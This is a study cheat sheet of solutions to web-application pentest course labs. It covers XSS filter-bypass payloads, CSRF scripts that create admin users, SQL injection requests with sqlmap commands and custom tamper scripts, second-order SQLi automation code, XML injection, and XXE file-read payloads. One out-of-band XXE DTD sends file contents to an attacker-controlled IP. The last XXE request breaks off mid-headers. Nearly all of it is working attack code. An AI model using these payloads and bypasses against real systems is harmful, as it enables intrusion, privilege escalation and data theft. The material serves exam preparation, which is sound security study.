# eWAPTX Labs Cheatsheet
A simple cheatsheet based on the exercises provided by the course, usable for quick reference during the exam.
# XSS
## Level 1
No sanitization, simple payload:
```bash
<script>alert('l33t')</script>
```
## Level 2
Script tag is blocked by the regex: 
```bash
'#<script([\s])*>#is'
```
Nested scripts:
```bash
<script <script>>alert('l33t')</script>
```
## Level 3
Script tag blocked by recursive regex:
```bash
'#<script(.*?)>#is'
```
IMG tag:
```bash
<img/src onerror=alert('l33t')>
```
## Level 4
```bash
//Script must be closed, here\'s a stronger filter... isn\'t it?
$search = preg_replace('#<script(.*?)>(.*?)</script(.*)?>#is', NOSCRIPT, $search);
//No ON no party!  
$search = preg_replace('#(on\w+\s*=)#s', NOEVENTS, $search);
```
Malformed SVG:
```bash
<svg><script>alert('l33t')
```
## Level 5
```bash
//No ON no party!  
$search = preg_replace('#(on\w+\s*=)#s', NOEVENTS, $search);
//No Functions no party! 
$search = preg_replace('#[()]#s', NOFUNCTIONS, $search);
```
No parenthesis:
```bash
<svg><script>alert&lpar;'l33t'&rpar;
```
## Level 6
```bash
//No alert no party!  
$search = preg_replace('#alert#is', NOALERT, $search);
```
No alert (with unicode):
```bash
<script>\u0061lert('l33t')</script>
```
## Level 7
```bash
// No Unicode escaping.. there are a lot of smart guys out of there...
// Thanks to stackoverflow.com > http://bit.ly/SO_decode_unicode
$search = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($m) {
return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
}, $search);
   
//No alert no party!  
$search = preg_replace('#alert#is', NOALERT, $search);
```
No alert (with eval and hex):
```bash
<script>eval('\x61lert(\'l33t\')')</script>
```
## Level 8
```bash
//No alert no party!  
$search = preg_replace('#alert#is', NOALERT, $search);

return <<<RESULT
  No products here.. 
  <!-- todo: debug this -->
  <script>
    //console.debug( $search );
  </script>
RESULT;
```
New line insertion (to break free inside a function):
```bash
[NL]eval('\x61lert(\'l33t\')'
```
Alternatives:
```bash
</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`l33t` //>#
</Title/</script/><img src=x onerror="\u0061lert('l33t')"/>#
</script><svg onload="eval(atob('YWxlcnQoJ2wzM3QnKQ=='))"> 
```
## Level 9
```bash
// Breaking bad... more stronger
$search = preg_replace('#[\n\r]#', "", $search);
   
//No alert no party!  
$search = preg_replace('#alert#is', NOALERT, $search);

return <<<RESULT
  No products here.. 
  <!-- todo: debug this -->
  <script>
    //console.debug( $search );
  </script>
RESULT;
```
New line insertion, with new line as unicode:
```bash
[\u2028]eval('\x61lert(\'l33t\')'
```
Alternatives:
```bash
</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`l33t` //>#
</Title/</script/><img src=x onerror="\u0061lert('l33t')"/>#
</script><svg onload="eval(atob('YWxlcnQoJ2wzM3QnKQ=='))"> 
```
## Level 10
```bash
// No more string ...
$search = preg_replace("#[\'\"+]#", "", $search);
// ... no more alert ...  
$search = preg_replace("#alert#is", NOALERT, $search);
// ... no no more alternative ways!
$search = preg_replace("#.source#is", "", $search);
$search = preg_replace("#.fromCharCode#is", "", $search);
```
Use of alert in base 30 and l33t in base 36:
```bash
<script>eval(8680439..toString(30))(983801..toString(36))</script>
```
## Level 11
```bash
// No scripts from untrusted origins or you\'ll see a nice gorilla
   preg_match('#^(?:https?:)?\/\/11.xss.labs\/#is', urldecode($search), $matches);   
   if(empty($matches)) $search = "...untrusted...";   

   // don\'t break the src tag   
   $search = preg_replace('#"#', "", $search);
   // ehehe and now? Are you still a ninja?
   $search = strtoupper($search);
```
Injection of script from external site with origin bypass as creds:
```bash
http://11.xss.labs%2f@hacker.site/x.js
```

# CSRF
## Level 1
No checks:
```html
<html>
<script type="text/javascript">
   var url =  "http://{LABID}.csrf.labs/add_user.php";
   var params =  "name=Malice&surname=Smith&email=malice23%40hacker.site&role=ADMIN&submit=";
   var CSRF = new XMLHttpRequest();
   CSRF.open("POST", url, true);
   CSRF.withCredentials = 'true'; //IMPORTANT MUST!!
   CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   CSRF.send(params);
</script>
</html>
```

## Level 2
Same as above, but it triggers via an XSS.

## Level 3
GET of CSRF token first, and then submit
```html
<script type="text/javascript">
function addUser(token) {
    var url = "http://3.csrf.labs/add_user.php";
    var param = "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=&CSRFToken=" + token; 
    var CSRF = new XMLHttpRequest();
    CSRF.open("POST",url,true);
    CSRF.withCredentials = 'true';
    CSRF.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    CSRF.send(param);
}
// Extract the token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function() { 
    if (XHR.readyState == 4 ) {
        var htmlSource = XHR.responseText; // the source of users.php
        // Extract the token 
        var parser = new DOMParser().parseFromString(htmlSource, "text/html");
        var token = parser.getElementById('CSRFToken').value;
        addUser(token);
    }
}
XHR.open('GET', 'http://3.csrf.labs/users.php', true);
XHR.send();
```

## Level 4

## Level 5

# SQL Injection
## Level 1
Simple union. 
PoC:
```bash
GET / HTTP/1.1
Host: 1.sqli.labs
User-Agent: ' UNION SELECT user(); -- -
```
SQLMap: 
```bash
sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
```
## Level 2
UNION and standard payloads like 1='1 are filterer.
PoC, False Blind:
```bash
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: \' or \'elscustom\'=\'elsFALSE
```
PoC, True Blind:
```bash
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elscustom
```
SQLMap:
```bash
sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
```
## Level 3
Spaces are filtered.
PoC:
```bash
GET / HTTP/1.1
Host: 3.sqli.labs
User-Agent: '/**/UNION/**/SELECT/**/@@version;#
```
SQLMap:
```bash
sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner
```
## Level 4
Comments non longer work.
PoC:
```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'UNION(select('PoC String'));#
```
We cannot easily automate this task, as sqlmap should balance the parentesis.
To exploit by hand you have to first find the tables in the current database:
```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: \'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
```
Then you can enumarate the columns:
```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: \'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
```
## Level 5
This is similar to SQLi 4, but the developer used doublequotes around strings.
PoC:
```bash
GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: \"UNION(select('PoC String'));#
```
To exploit by hand you have again to find the tables in the current database:
```bash
GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: \"union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
```
## Level 6
MySQL's reserved words have been filtered. Using RaNDom case does not help, as you can have, for example, somethin like "InfoRMaTIon_ScheMa" who will become "InfoRMaTI_ScheMa", as "on" or "ON" is a valid reserved word.

PoC:
```bash
GET / HTTP/1.1
Host: 6.sqli.labs
User-Agent: ' UNiOn seLect @@versiOn;#
```
The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter
You have to write a simple tampering script:
```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces each keyword a CaMeLcAsE VeRsIoN of it.

    >>> tamper('INSERT')
    'InSeRt'
    """

    retVal = str()

    if payload:
        for i in xrange(len(payload)):
            if (i % 2 == 0):
                # We cannot break 0x12345
                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
                    retVal += payload[i].upper()
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i].lower()
    return retVal
```
SQLMap command line:
```bash
sqlmap -u 'http://6.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
```
## Level 7
In this scenario, the case-insensitive filter cuts out all the reserved words, but the filter is not recursive.
PoC:
```bash
GET / HTTP/1.1
Host: 7.sqli.labs
User-Agent: ' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
```
Tampering script:
```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Insert FILL after every character

    >>> tamper('INSERT')
    'IfillNfillSfillEfillRfillTfill
    """

    retVal = str()

    FILL='ZEROFILL'

    if payload:
        for i in xrange(len(payload)):
            retVal += payload[i]+FILL
    # Uncomment to debug
#    print "pretamper:", payload
    return retVal
```
SQLMap automation:
```bash
sqlmap -u 'http://7.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner
```
## Level 8
Simple URL encoding.
PoC:
```bash
GET / HTTP/1.1
Host: 8.sqli.labs
User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
```
SQLMap Automation:
```bash
sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner
```
## Level 9
SQLi 9
Double encoding.
PoC:
```bash
GET / HTTP/1.1
Host: 9.sqli.labs
User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
```
SQLMap Automation:
```bash
sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner
```
## Level 10
This labs combines reserver keyword filtering with an injection in a function.
PoC:
```bash
GET / HTTP/1.1
Host: 10.sqli.labs
User-Agent: \') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -
```
SQLMap Automation:
```bash
sqlmap -u 'http://10.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix="notexistant')" --suffix="; -- " --union-char=els --banner
```

# 2nd Order SQLi
In these labs, the injection occurs in the filename of an image which is posted to the website, hence, it is a 2nd order SQLi with a POST as the first request (img to website) and then a get as the second request (get the filename which triggers the injection). SQLMap supports 2nd order GET-GET but not POST-GET, so we need to automate the first step which sends the sqlmap payload as the filename and then gets the corresponding image. To do so we can host a php scrip (views.php which follows) on our website which will take care of posting the image to the website so that sqlmap can then simply get the payload it needs. 
Code is as follows:
```php
# view.php
<?php

if(empty($_GET['payload'])) die("The payload please!!");
/*********************
 CONFIGURATIONS
*********************/
# File name aka SQLi Payload
$payload = $_GET['payload'];
# Target POST aka where to upload the images
$injectionURL = 'http://selfie4you.site/upload.php';
# Target GET aka page with the results of the SQLi (GET)
$resultsURL = "http://selfie4you.site/view.php?file=".urlencode($payload);
# IMG to upload (b64 encoded)
$img = '/9g=';

/******************************************/

/*********************
 POST GENERATOR
*********************/
# We have to build a custom HTTP Post request with our payload as filename
# (Form-base File Upload in HTML - RFC1867)

# Boundary for the multipart POST
$boundary = "2ndOrderPAYLOAD";

# Decode the data
$img_raw = base64_decode($img);

// Data POST body
$postbody = <<<POSTBODY
--{$boundary}
Content-Disposition: form-data; name="file"; filename="{$payload}" Content-Type: image/jpeg

{$img_raw}

--{$boundary}--

POSTBODY;

// POST HEADERS
$headers = array(
    "Expect: 100-continue",
    "Content-Type: multipart/form-data; boundary={$boundary}, // change Content-Type
);

/*********************
 POST MAKER!
*********************/
// CURL Handler
$ch = curl_init();
//CURL options
// Set CURL to POST
curl_setopt($ch, CURLOPT_POST, true);
// CURL POST URL
curl_setopt($ch, CURLOPT_URL, $injectionURL);
// We do not want to reflect the output of the POST to sqlmap
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// Headers
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// Body
curl_setopt($ch, CURLOPT_POSTFIELDS, $postbody);

// Do the actual POST
$result = curl_exec($ch);
curl_close($ch);

/*************************************
 REFLECT THE RESULT FOR AUTOMATION
*************************************/
$injectionresponse = file_get_contents($resultsURL);
echo $injectionresponse;
```
A python2 equivalent can look like this:
```python
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import parse_qs
import cgi
import requests
import json
import base64
import urllib
import re

class GP(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def do_HEAD(self):
        self._set_headers()
    def do_GET(self):
        self._set_headers()

        # Reading payload
        query = parse_qs(self.path[2:])
        payload = query["payload"][0]
        
        # POST file (CHANGE url_Website)
        url = 'http://url_website/sqli/public/create.php'

        # Uncomment to use a real file (name it 1.jpg in the server.py folder)
        #files = {'file': (payload,open('1.jpg','rb'))}

        # Using a b64 magic number to simulate the file 
        files = {'image': (payload,base64.b64decode('/9g='))}
        

        # Uncomment for Burp interception
        
        '''
        proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080'
                }

        r = requests.post(url, files=files, proxies=proxies, verify=False)
        
        '''

        # No Burp interception

        # Get response (CHANGE url_Website)

        r = requests.post(url, files=files, verify=False)

        url = "http://url_Website/sqli/public/index.php"
        response = requests.get(url,verify=False)

        # Replace parenthesis to not break regex
        payload = payload.replace(")", "\)")
        payload = payload.replace("(", "\(")
        # regex to serach the response
        z= re.search('<div class=\"imageDiv\">\n.*\n.*\n.*'+payload+'.*\n.*\n.*<\/div>',str(response.text))

        if z:
            self.wfile.write(z.group(0))

        
        
    def do_POST(self):
        self._set_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        print form.getvalue("foo")
        print form.getvalue("bin")
        self.wfile.write("<html><body><h1>POST Request Received!</h1></body></html>")

def run(server_class=HTTPServer, handler_class=GP, port=8088):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Server running at localhost:8088...'
    httpd.serve_forever()

run()
```
## 1 - ENTRY LEVEL
```bash
Query: $query = "SELECT views from attachments where filename='$filename'";
# PoC
http://hacker.site/2nd/view.php?payload=%27%20union%20select%20@@version;%20--%20-
# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' \
	--technique=U --suffix='; -- -' --banner
./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' \
	--technique=U --suffix='; -- -' -D selfie4you01 -T accounts --dump --no-cast
```
## 2 - UNION SELECT
```bash
Query: $query = "SELECT views FROM attachments where filename='$entry';";
# PoC
http://hacker.site/2nd/upload.php?lab=2&payload=\'+union+select+@@version;%23
# SQLMAP
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" \
	-p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL \
	--banner --no-cast
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" \
	-p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL \
	-D selfie4you02 -T accounts --dump --no-cast
```
## 3 - UNION SELECT 
```bash
Filters: /UNION/, /SELECT/
Query: $query = "SELECT views FROM attachments where filename='$entry';";
# PoC
http://hacker.site/2nd/upload.php?lab=3&payload=a%27%20UNIoN%20SeLECT%20%27PoC%20String%27;%20--%20-
# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&payload=b' \
	-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \
	--tamper=randomcase --banner
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&payload=b' \
	-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \
	--tamper=randomcase -D selfie4you03 -T accounts --dump
```
## 4 - Boolean-based blind
```bash
Filters: /UNION/i, /\ AND\ /i
Query: $query = "SELECT views FROM attachments where filename='$entry';";
# POCs
# (%26) == &
TRUE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+'123'='123
FALSE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+'123'='1
# using true (1) and false (0)booleans
# (%23) == #
TRUE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg\'+%26%26+TRUE;%23
FALSE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg\'+%26%26+FALSE;%23

# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	--banner --flush-session

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	-D selfie4you04 -T accounts --dump
```
## 5	- Boolean-based blind
```bash
Filters: /UNION/i, /\ AND\ /i, /\ OR\ /i
Query: $query = "SELECT views FROM attachments where filename='$entry';";
# POCs
# same as #4 but with filter that applies to OR too 
# (%7C) == |

# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	--banner --flush-session

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	-D selfie4you05 -T accounts --dump 
```
# 6	- Boolean-based blind
```bash
Filters: /UNION/i, /AND/i, / OR/i
Query: $query = "SELECT views FROM attachments where filename='$entry';";

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=6&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' --tamper="symboliclogical, space2VT.py" \
	--no-cast --threads=10 -v 3 \
	--banner --flush-session 
	
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=6&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py" \
	--no-cast --threads=5 -v 3 \
	-D selfie4you06 -T accounts \	
	--columns 
```
# 7	- Boolean-based blind
```bash
Filters: /UNION/i, /AND/i, / OR/i, /6163636f756e7473/, /selfie4you07.accounts/ (space to verical tab filter to bypass [space]OR filter)
Query: $query = "SELECT views FROM attachments where filename='$entry';";
# PoC
TRUE:	http://hacker.site/2nd/upload.php?lab=7&payload=01.jpg\'+%26%26+TRUE;%23

# SQLMAP
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py, accounts.py" \
	--no-cast --threads=5 -v 3 \
	--banner --flush-session 
	
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py, accounts.py" \
	--no-cast --threads=5 -v 3 \
	-D selfie4you07 -T accounts \
	--columns
```
```python
#tamper script accounts.py
#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces
		The HEX value of for the accounts table is filtered, changing it to 'accounts' we can bypass the filter.
		Note the quotes! This value is used when the sqlmap extracts the values from the INFORMATION_SCHEMA db
			- 0x6163636f756e7473 --> 'accounts'
		
		Since the database is already selected in the php application, we can strip the database name and bypass the filter
			- selfie4you07.accounts --> accounts 	
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)0x6163636f756e7473", "'accounts'", re.sub(r"(?i)selfie4you07.accounts", "accounts", payload))

	return retVal
```
```python 
#tamper script space2VT.py
#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space to vertical tab for functions/operators/declarations that start with the regex / OR/i such as:
	 - ORD
	 - ORDER

    >>> tamper("ORD(MID((VERSION()),1,1))>64;")
    %0BORD(MID((VERSION()),1,1))>64;
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)\bOR", "%0bOR", payload)

    return retVal
```

# XXE
## XML Injections
### Level 1
We find the following XML structure from an old function left in the registration JS script:
```javascript
function WSregister__old() {
    ...
    var xml = '<?xml version="1.0" encoding="utf-8"?> ';
    xml += '<user>                                    ';
    xml += '    <role>2</role>                        ';
    xml += '    <name>' + name + '</name>             ';
    xml += '    <username>' + username + '</username> ';
    xml += '    <password>' + password + '</password> ';
    xml += '</user>                                   ';
    ...
}
```

We can therefore try the injection in multiple places. We see that XML specific chars, such as <> are encoded when passed in the name and password parameters, but not in the username. So we can simply register a user with the following params:
```xml
name:     useless
username: useless</username></user><user><rule>1</rule><name>l33t</name><username>l33t
password: l33t
```
We see that two registration requests are made and thus the l33t account with admin rule is created. We then simply log in.
### Level 2
Again, we find the XML structure as above.
The password parameter does not seem injectable, but username and name do.
If we inject into name though, it doesn't work and same goes if we inject into username.
Interestingly, the application returns that a > is expected when injecting
```xml
</username></user><user><rule>1</rule><name>l33t</name><username>l33t
```
So, it truncates the input in <\/rule>, so we have a character limitation. Since we have two params to inject though, we can still register a user supplying the following payload:
```xml
name:       a</name></user><user><rule>1<\!--
username:   --></rule><name>x</name><username>x
password:   l33t
```
Separating the injection in two params is working and we register the admin user this way.
### Level 3
Again, as above injection happens only on name and username parameters. The injection above though does not work, because of some filtering or encoding.
Tampering with the application we see that '&', '\', ',', '.' are filtered, while '<','>' are not.
We can therefore inject as follows:
```xml
name:     </name></user><user><rule{NEW_LINE}>1<\!--
username: --></rule{NEW_LINE}><name></name><username>x
password: l33t
```
This though would not work, as the usernmae field is too long. We can try to remove the name tag, as it is not used during the login, and thus we get the working payload:
```xml
name:     </name></user><user><rule{NEW_LINE}>1<\!--
username: --></rule{NEW_LINE}><username>l33t
password: l33t
```
NOTE: on this one use burp to register so that \n can be injected easily.
## XXE 
### Level 1
The provided exploit script is:
```bash
#!/bin/bash

if [ $# -ne 1 ]; then
        echo "Usage $0 <file_path_to_read>"
        exit
fi

XML="<?xml version='1.0'?>
<!DOCTYPE xxe [
   <!ENTITY xxe SYSTEM '$1' >
]>
<login>
   <username>XXEME &xxe;</username>
   <password>password</password>
</login>"

echo -e "==========================================="
echo -e "\t\tSTART"
echo -e "\nExploiting the XXE using the following XML:"
echo $XML | xmllint --nowarning  --format -

echo -e "\n\nResults: ";
curl -s 'http://1.xxe.labs/login.php' --data "$XML" --header "Authxxe:login"

echo -e "\n\n\t\tEND";
echo -e "===========================================";
```
NOTE: All exploits can be done with burp repeater.
Using the command:
```bash
./exploit.sh /var/www/1/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g'
```
We can automate the task and retrieve the username contained in the file.
With burp we simply send the following to the login function and decode stuff:
```bash

```
### Level 2
Same as above, the difference is that the injection tells us to retrieve the file whois.php.
Burp:
```bash
POST /login.php HTTP/1.1
Host: 2.xxe.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
AuthXXE: login
X-Requested-With: XMLHttpRequest
Content-Length: 239
Origin: http://1.xxe.labs
Connection: close
Referer: http://1.xxe.labs/

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///var/www/2/.letmepass" > ]>
<login>
<username>
&ext;
</username>
<password>
asd
</password>
</login>                                          
```
Automating it becomes:
```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www/xxe/2/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g'
```
And then to query the whois:
```bash
curl -s 'http://2.xxe.labs/whois.php' -X DELETE | base64 -d
```
### Level 3
Injection with burp stays the same:
```bash
POST /login.php HTTP/1.1
Host: 3.xxe.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
AuthXXE: login
X-Requested-With: XMLHttpRequest
Content-Length: 280
Origin: http://1.xxe.labs
Connection: close
Referer: http://1.xxe.labs/

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "php://filter/convert.base64-encode/resource=/var/www/3/.letmepass.php" > ]>
<login>
<username>
&ext;
</username>
		  	<password>
asd
</password>
</login>                                          
```
Automating with the script:
```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www /3/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g' \
| base64 -d > whaat.php
```
And then to read the config file:
```bash
echo 'var_dump($config);' >> whaat.php | php whaat.php
```
NOTE: When extracting base64, the / char is escaped as \/, thus we need to remove the \ before decoding.
### Level 4
We Extract with burp as follows:
```bash
POST /login.php HTTP/1.1
Host: 4.xxe.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
AuthXXE: login
X-Requested-With: XMLHttpRequest
Content-Length: 276
Origin: http://1.xxe.labs
Connection: close
Referer: http://1.xxe.labs/

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "php://filter/convert.base64-encode/resource=/var/www/4/.letmepass" > ]>
<login>
<username>
&ext;
</username>
<password>
asd
</password>
</login>                                          
```
After decoding we see that we have a PNG file.
To automate:
```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g' \
| base64 -d > wohoo.png
```
The allowed username is in the image.
### Level 5
With Burp we get the content of 5/.letmepass:
```bash
POST /login.php HTTP/1.1
Host: 5.xxe.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
AuthXXE: login
X-Requested-With: XMLHttpRequest
Content-Length: 276
Origin: http://1.xxe.labs
Connection: close
Referer: http://1.xxe.labs/

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "php://filter/convert.base64-encode/resource=/var/www/5/.letmepass" > ]>
<login>
<username>
&ext;
</username>
<password>
asd
</password>
</login>                                          
```
Which, after decoding says:
```bash
In the root folder there is a hidden folder (hidden/) that contains a PHP file.
The username is enclosed within the tag <HIDE_ME_PLEASE>, e.g.:
<HIDE_ME_PLEASE>SecretUsername</HIDE_ME_PLEASE>
Find the file!
Maybe here you can find some useful wordlists here: http://blog.thireus.com/web-common-directories-and-filenames-word-lists-collection
```
We can then pass the stuff to intruder to get the correct file using the suggested wordlist as payload:
```bash
POST /login.php HTTP/1.1
Host: 5.xxe.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
AuthXXE: login
X-Requested-With: XMLHttpRequest
Content-Length: 276
Origin: http://5.xxe.labs
Connection: close
Referer: http://5.xxe.labs/

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "php://filter/convert.base64-encode/resource=/var/www/hidden/§f§" > ]>
<login>
<username>
&ext;
</username>
<password>
asd
</password>
</login>                                          
```
### Level 6
Same, just OOB. We server the following DTD on port 8888 via Python3 http server:
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.90.112.2:4444/?x=%file;'>">
%eval;
%exfiltrate;
```
We then setup another Python server on port 4444 and send the following request with Burp:
```bash
POST /login.php HTTP/1.1
Host: 6.xxe.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
AuthXXE: login
X-Requested-With: XMLHttpRequest
Content-Length: 300
Origin: http://6.xxe.labs
Connection: close
